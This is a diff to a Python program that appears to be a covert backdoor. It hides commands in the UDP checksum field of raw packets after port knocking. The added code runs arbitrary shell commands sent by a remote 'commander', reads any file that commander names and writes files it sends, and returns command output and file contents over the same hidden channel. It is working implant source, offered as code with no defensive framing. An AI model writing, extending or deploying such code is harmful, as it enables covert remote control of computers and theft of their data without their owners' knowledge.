@@ -24,13 +24,11 @@ COMMAND_PORT = 8888  # UDP port for covert channel (after knocking)
 
 class CommandType(IntEnum):
     """Commands encoded in UDP checksum field"""
-    PING = 0x1234
-    SHELL_EXEC = 0x2345
-    READ_FILE = 0x3456
-    WRITE_FILE = 0x4567
-    LIST_DIR = 0x5678
-    SYSINFO = 0x6789
-    DISCONNECT = 0x789A
+    DISCONNECT = 0x1234
+    UNINSTALL = 0x2345
+    TRANSFER_TO_CLIENT = 0x3456
+    TRANSFER_FROM_CLIENT = 0x4567
+    RUN_COMMAND = 0x5678
     ACK = 0x9ABC
     ERROR = 0xABCD
 
@@ -40,6 +38,93 @@ class RawSocketProtocol:
 
     def __init__(self):
         self.sequence = 0
+
+    def calculate_checksum(self, data):
+        """Calculate checksum"""
+        if len(data) % 2 != 0:
+            data += b'\x00'
+
+        checksum = 0
+        for i in range(0, len(data), 2):
+            word = (data[i] << 8) + data[i + 1]
+            checksum += word
+
+        checksum = (checksum >> 16) + (checksum & 0xFFFF)
+        checksum += checksum >> 16
+
+        return ~checksum & 0xFFFF
+
+    def create_ip_header(self, src_ip, dst_ip, total_length):
+        """Create IP header"""
+        ip_version = 4
+        ip_ihl = 5
+        ip_tos = 0
+        ip_tot_len = total_length
+        ip_id = self.sequence & 0xFFFF
+        ip_frag_off = 0
+        ip_ttl = 64
+        ip_proto = socket.IPPROTO_UDP
+        ip_check = 0
+        ip_saddr = socket.inet_aton(src_ip)
+        ip_daddr = socket.inet_aton(dst_ip)
+
+        ip_ihl_version = (ip_version << 4) + ip_ihl
+
+        ip_header = struct.pack('!BBHHHBBH4s4s',
+                                ip_ihl_version, ip_tos, ip_tot_len,
+                                ip_id, ip_frag_off, ip_ttl, ip_proto,
+                                ip_check, ip_saddr, ip_daddr)
+
+        ip_check = self.calculate_checksum(ip_header)
+
+        ip_header = struct.pack('!BBHHHBBH4s4s',
+                                ip_ihl_version, ip_tos, ip_tot_len,
+                                ip_id, ip_frag_off, ip_ttl, ip_proto,
+                                ip_check, ip_saddr, ip_daddr)
+
+        return ip_header
+
+    def create_udp_packet(self, src_ip, dst_ip, src_port, dst_port,
+                          payload, command_type):
+        """Create UDP packet with command in checksum"""
+        udp_length = 8 + len(payload)
+        udp_checksum = int(command_type)  # COVERT CHANNEL
+
+        udp_header = struct.pack('!HHHH',
+                                 src_port, dst_port,
+                                 udp_length, udp_checksum)
+
+        total_length = 20 + len(udp_header) + len(payload)
+        ip_header = self.create_ip_header(src_ip, dst_ip, total_length)
+
+        packet = ip_header + udp_header + payload
+        return packet
+
+    def send_packet(self, src_ip, dst_ip, src_port, dst_port,
+                    command_type, payload=b''):
+        """Send covert packet"""
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
+
+            self.sequence += 1
+            actual_src_port = self.sequence & 0xFFFF
+
+            packet = self.create_udp_packet(
+                src_ip, dst_ip,
+                actual_src_port, dst_port,
+                payload, command_type
+            )
+
+            sock.sendto(packet, (dst_ip, 0))
+            sock.close()
+            return True
+
+        except PermissionError:
+            print("[!] Raw sockets require root privileges")
+            return False
+        except Exception as e:
+            print(f"[!] Error sending: {e}")
+            return False
 
     def parse_udp_packet(self, packet):
         """Parse UDP packet and extract covert data"""
@@ -242,61 +327,91 @@ class Client:
     def process_command(self, command_type, payload, src_ip):
         """Process received command"""
 
-        if command_type == CommandType.PING:
-            print("[*] Processing PING")
-            print("    Response: PONG")
+        if command_type == CommandType.DISCONNECT:
+            print("[*] Processing DISCONNECT")
+            print(f"    Closing session with {src_ip}")
 
-        elif command_type == CommandType.SHELL_EXEC:
+        elif command_type == CommandType.UNINSTALL:
+            print("[*] Processing UNINSTALL")
+            print("    Initiating uninstall sequence...")
+
+        elif command_type == CommandType.TRANSFER_TO_CLIENT:
+            print("[*] Processing TRANSFER_TO_CLIENT")
+            # Payload format: filename|filedata
+            try:
+                payload_str = payload.decode('utf-8', errors='ignore')
+                if '|' in payload_str:
+                    filename, filedata = payload_str.split('|', 1)
+                    print(f"    Receiving file: {filename}")
+                    print(f"    Size: {len(filedata)} bytes")
+                    # Write file to /tmp
+                    filepath = f"/tmp/{filename}"
+                    with open(filepath, 'w') as f:
+                        f.write(filedata)
+                    print(f"    File saved to: {filepath}")
+                else:
+                    print("    Error: Invalid payload format")
+            except Exception as e:
+                print(f"    Error: {e}")
+
+        elif command_type == CommandType.TRANSFER_FROM_CLIENT:
+            filepath = payload.decode('utf-8', errors='ignore')
+            print(f"[*] Processing TRANSFER_FROM_CLIENT: {filepath}")
+            try:
+                with open(filepath, 'rb') as f:
+                    content = f.read()
+                print(f"    File size: {len(content)} bytes")
+                # Send file back to commander
+                self.send_response(src_ip, CommandType.ACK, content)
+            except Exception as e:
+                print(f"    Error: {e}")
+                error_msg = str(e).encode('utf-8')
+                self.send_response(src_ip, CommandType.ERROR, error_msg)
+
+        elif command_type == CommandType.RUN_COMMAND:
             cmd = payload.decode('utf-8', errors='ignore')
-            print(f"[*] Processing SHELL_EXEC: {cmd}")
+            print(f"[*] Processing RUN_COMMAND: {cmd}")
             try:
                 result = subprocess.run(
                     cmd, shell=True,
                     capture_output=True, text=True,
                     timeout=30
                 )
-                output = result.stdout[:200] if result.stdout else "(no output)"
-                print(f"    Output: {output}")
-                if result.stderr:
-                    print(f"    Stderr: {result.stderr[:200]}")
+                # Send stdout back to commander
+                output = result.stdout if result.stdout else ""
+                print(f"    Sending output ({len(output)} bytes) to commander")
+                self.send_response(src_ip, CommandType.ACK, output.encode('utf-8'))
             except Exception as e:
                 print(f"    Error: {e}")
+                error_msg = str(e).encode('utf-8')
+                self.send_response(src_ip, CommandType.ERROR, error_msg)
 
-        elif command_type == CommandType.READ_FILE:
-            filepath = payload.decode('utf-8', errors='ignore')
-            print(f"[*] Processing READ_FILE: {filepath}")
-            try:
-                with open(filepath, 'r') as f:
-                    content = f.read(500)
-                    print(f"    Content preview: {content[:100]}...")
-            except Exception as e:
-                print(f"    Error: {e}")
+    def send_response(self, dst_ip, command_type, payload):
+        """Send response back to commander via covert channel"""
+        try:
+            # Use the raw socket protocol to send response
+            self.protocol.send_packet(
+                self.get_local_ip(),
+                dst_ip,
+                0,  # Source port (sequence)
+                self.command_port,
+                command_type,
+                payload
+            )
+            print(f"    Response sent to {dst_ip}")
+        except Exception as e:
+            print(f"    Failed to send response: {e}")
 
-        elif command_type == CommandType.LIST_DIR:
-            dirpath = payload.decode('utf-8', errors='ignore')
-            print(f"[*] Processing LIST_DIR: {dirpath}")
-            try:
-                import os
-                entries = os.listdir(dirpath)
-                print(f"    Found {len(entries)} entries")
-                print(f"    First 10: {entries[:10]}")
-            except Exception as e:
-                print(f"    Error: {e}")
-
-        elif command_type == CommandType.SYSINFO:
-            print("[*] Processing SYSINFO")
-            try:
-                import platform
-                print(f"    System: {platform.system()}")
-                print(f"    Node: {platform.node()}")
-                print(f"    Release: {platform.release()}")
-                print(f"    Machine: {platform.machine()}")
-            except Exception as e:
-                print(f"    Error: {e}")
-
-        elif command_type == CommandType.DISCONNECT:
-            print("[*] Processing DISCONNECT")
-            print(f"    Closing session with {src_ip}")
+    def get_local_ip(self):
+        """Get local IP address"""
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.connect(("8.8.8.8", 80))
+            local_ip = s.getsockname()[0]
+            s.close()
+            return local_ip
+        except:
+            return "127.0.0.1"
 
     def start(self):
         """Start the client"""
